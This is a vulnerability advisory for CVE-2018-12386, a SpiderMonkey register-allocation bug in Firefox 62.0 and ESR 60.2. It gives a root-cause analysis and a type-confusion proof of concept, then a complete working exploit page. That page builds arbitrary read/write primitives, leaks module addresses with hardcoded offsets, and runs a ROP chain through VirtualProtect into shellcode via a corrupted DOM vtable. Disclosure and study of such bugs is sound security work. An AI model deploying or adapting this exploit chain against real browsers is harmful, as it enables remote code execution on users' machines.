**Vulnerability Summary**<br>
A vulnerability in register allocation in JavaScript can lead to type confusion, allowing for an arbitrary read and write, which leads to remote code execution inside the sandboxed content process when triggered.

**Vendor Response**<br>
The reported security vulnerability was fixed in Firefox 62.0.3 and Firefox ESR 60.2.2.

**CVE**<br>
CVE-2018-12386

**Credit**<br>
Independent security researchers, Niklas Baumstark, Samuel Groß and Bruno Keith, had reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
Firefox 62.0<br>
Firefox ESR 60.2<br>

**Vulnerability Details**<br>
While fuzzing Spidermonkey(Mozilla’s JavaScript engine written in C and C++), we trigger a debug assertion with the following minimized sample:
```JavaScript
function f() {
	function g() {}
	let p = Object;
	for (; p > 0; p = p + 0) {
		for (let i = 0; i < 0; ++i) {
			while (p === p) {}
		}
		while (true) {}
	}
	while (true) {}
}
f();
```

Which triggered the following assertion in the register allocator:<br>
`Assertion failure: *def- &gt;output() != alloc`<br>
This implies that somehow a wrong register is being used somewhere in the emitted code.

**Root Cause Analysis**<br>
The function described above produces the following basic blocks:

```code
---------------------
 Block 0:
 ...
 def v3
 ...
 def v6
 ...
 goto block 2
---------------------
 Block 2:
 phi: def v16, use v6
 ...
 use v3
 ...
---------------------
```
The backtracking allocator decides on the following allocations:

```code
v3: block 0 @ rax, block 2 @ stack:8
v6: block 0 @ stack:16
v16: block 2 @ rax
```
Now BacktrackingAllocator::resolveControlFlow adds moves (via MoveGroup LIR statements) to account for the phi and the distinct ranges of v3 in the two blocks.It introduces a MoveGroup [rax -> stack:8] to the beginning of block 2 to change the v3 location and int.And it introduces a MoveGroup [stack:16 -> rax] to the end of block 0 to resolve the phi. These two changes conflict with each other: Instead of v3, v16 = v6 will be located at stack:8.
Visualization:

```code
v3:
 block 0 block 2
 rax ==================
 stack:8 ====================
v6 -> v16:
 block 0 block 2
 rax ====================
 stack:16 ==================
```
Conditions:
In order for this to occur we require the following conditions:
1. Two blocks A and B with a control flow edge A -> B
2. Vreg v1 that has distinct allocations x in A and y in B
3. a phi vreg v2 that has allocation x in B<br>

This will introduce the problematic pattern:
```code
MoveGroup [? -> x] // from phi
Goto B
MoveGroup [x -> y] // move due to changing allocation
```
With some manual experimenting, the register misallocation can be turned into a type confusion. The basic idea is to compile a function that takes two arguments, one of type X and one of type Y. The function then generates optimized code based on the speculated types and adds runtime guards to ensure that the speculations still holds.
However, due to the register misallocation, the register holding the value of type X is now overwritten with the value of type Y, causing the type confusion. The following code demonstrates this:
```JavaScript
// Generate objects with inline properties
for (var i = 0; i < 100; i++)
	var o1 = {
		s: "asdf",
		x: 13.37
	};
for (var i = 0; i < 100; i++)
	var o2 = {
		s: "asdf",
		y: {}
	};
function f(a, b) {
	let p = b;
	for (; p.s < 0; p = p.s)
		while (p === p) {}
	for (var i = 0; i < 10000000; ++i) {}
	return a.x;
}
f(o1, o2);
f(o1, o2);
console.log(f(o1, o2));
// Object @ 2.156713602e-314
```
This code will be compiled such that in the last statement, when the inline property x of a is accessed, it will actually access the inline property y of b due to the register misallocation and the fact that x and y are stored at the same offset in the objects. As it expects the loaded property to be a double, it will return the loaded value as number. Since it now loads property y it returns a pointer as a double, resulting in an info leak. Note that for this PoC to work the argument b has to have a property named s which contains a string, otherwise different compilation will lead to different register usage and the bug will not be triggered. To get an arbitrary read/write it is possible to force a type confusion of an object with inline properties and a Float64Array. With that the backing storage pointer of the Float64Array can be overwritten with an arbitrary address by assigning to the inline property of the object. For RCE, a DOM object with a vtable is then corrupted and a virtual function called on it. From there a small ROP chain is triggered which loads the shellcode and jumps into it.

**Exploit**<br>
```JavaScript
<script>
print = alert;
var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);
var scratch = new ArrayBuffer(0x100000);
var scratch_u8 = new Uint8Array(scratch);
var scratch_u32 = new Uint32Array(scratch);
var BASE = 0x100000000;
var shellcode = null;
function hex(x) {
    return `0x${x.toString(16)}`
}
function bytes_to_u64(bytes) {
    return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
                +bytes[4]*0x100000000+bytes[5]*0x10000000000);
}
function i2f(x) {
    u32[0] = x % BASE;
    u32[1] = (x - (x % BASE)) / BASE;
    return f64[0];
}
function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}
function fail(msg) {
    print("FAIL " + msg);
    throw null;
}
function setup() {
    var container = {a: {}};
    var master = new Float64Array(0x100);
    var victim = new Uint8Array(0x100);
    var objs = [];
    for (var i = 0; i < 100; i++) {
        let x = {x: 13.37, y:victim, z:container};
        objs[i] = {x: 'asd', p1: {}, p2: {}, p3: {}, p4: x, p5: x, p6: {}};
    }
    var o = objs[0];
    var a = new Float64Array(1024);
    function f(a, b) {
        let p = b;
        for (; p.x < 0; p = p.x)
            while (p === p) {}
        for (var i = 0; i < 10000000; ++i){ }
        if (action==1) {
            victim_addr_f = a[3];
            container_addr_f = a[4];
        } else {
            a[7] = victim_addr_f;
        }
    }
    action = 1;
    for (var j = 0; j < 5; ++j)
        f(a, o);
    var victim_addr = f2i(victim_addr_f);
    var container_addr = f2i(container_addr_f);
    //print('victim @ ' + hex(victim_addr) + ' / container @ ' + hex(container_addr));
    var objs = [];
    for (var i = 0; i < 100; i++) {
        objs[i] = {x: 'asd', p1: {}, p2: {}, p3: {}, p4: {}, p5: master};
    }
    var o = objs[0];
    action = 2;
    for (var j = 0; j < 5; ++j)
        f(a, o);
    function set_addr(where) {
        master[7] = i2f(where);
    }
    function read64(where) {
        set_addr(where);
        var res = 0;
        for (var i = 7; i >= 0; --i) {
            res = res*0x100 + victim[i];
        }
        return res;
    }
    function read48(where) {
        set_addr(where);
        var res = 0;
        for (var i = 5; i >= 0; --i) {
            res = res*0x100 + victim[i];
        }
        return res;
    }
    function write64(where, what) {
        set_addr(where);
        for (var i = 0; i < 8; ++i) {
            victim[i] = what%0x100;
            what = (what-what%0x100)/0x100;
        }
    }
    function addrof2(x) {
        container.a = x;
        return read48(container_addr + 0x20);
    }
    function check() {
        print('master/victim: ' + hex(addrof2(master)) + ' ' + hex(addrof2(victim)));
    }
    function test() {
        var x = {x:0x1337};
        if (read48(addrof2(x)+0x20)%0x10000 != 0x1337) {
            check();
            fail("R/W does not work");
        }
    }
    return {
        addrof: addrof2,
        read64: read64,
        write64: write64,
        read48: read48,
        check: check,
        test: test,
    };
}
VERSION = '62.0';
function pwn() {
    var mem = setup();
    mem.test();
    var scratch_addr = mem.read64(mem.addrof(scratch_u8) + 0x38);
    var sc_offset = 0x20000 - scratch_addr % 0x1000;
    var sc_addr = scratch_addr + sc_offset
    scratch_u8.set(shellcode, sc_offset);
    var el = document.createElementNS('http://www.w3.org/2000/svg', 'image');
    var wrapper_addr = mem.addrof(el);
    var native_addr = mem.read64(wrapper_addr + 0x18);
    if (VERSION == '62.0') {
        var xul = native_addr - 0x31205f8;
        var ntdll = mem.read64(xul + 0x311CEE8) - 0x9a0e0 // NtQueryObject
        var kernel32 = mem.read64(xul + 0x3119B60) - 0x1a1c0 // GetModuleHandleW
        var pop_gadgets = [
            xul + 0xc712f, // pop rcx ; ret
            xul + 0x140222, // pop rdx ; ret
            xul + 0x611655, // pop r8 ; ret
            xul + 0xd1a6a1, // pop r9 ; ret
        ];
    } else {
        fail("Unknown version");
    }
    //print('xul.dll @ ' + hex(xul));
    //print('ntdll @ ' + hex(ntdll));
    //print('kernel32 @ ' + hex(kernel32));
    var gadget = ntdll + 0xA0705;
    var el = document.createElement('div');
    var el_addr = mem.read64(mem.addrof(el) + 0x20) * 2;
    var fake_vtab = scratch_addr;
    for (var i = 0; i < 100; ++i) {
        scratch_u32[2*i] = gadget % BASE;
        scratch_u32[2*i+1] = (gadget - gadget % BASE) / BASE;
    }
    var fake_stack = scratch_addr + 0x10000;
    var stack = [
        pop_gadgets[0],
        sc_addr,
        pop_gadgets[1],
        0x1000,
        pop_gadgets[2],
        0x40,
        pop_gadgets[3],
        scratch_addr,
        kernel32 + 0x193d0, // VirtualProtect
        sc_addr,
    ];
    for (var i = 0; i < stack.length; ++i) {
        scratch_u32[0x10000/4 + 2*i] = stack[i] % BASE;
        scratch_u32[0x10000/4 + 2*i + 1] = stack[i] / BASE;
    }
    mem.write64(el_addr + 0x10, fake_stack); // RSP
    mem.write64(el_addr + 0x50, pop_gadgets[0] + 1); // RIP = ret
    mem.write64(el_addr, fake_vtab);
    el.addEventListener('click', function (e) {}, false);
    el.dispatchEvent(new Event('click'));
}
function print_error(e) {
    print('Error: ' + e + '\n' + e.stack)
}
function exploit() {
    shellcode = new Uint8Array(0x100);
    shellcode.set([0xcc, 0xbe, 0x20, 0x18, 0xbe, 0x20, 0x18], 0);
    pwn();
}
</script>
<button onclick='exploit()'>pwn me please</button>
```
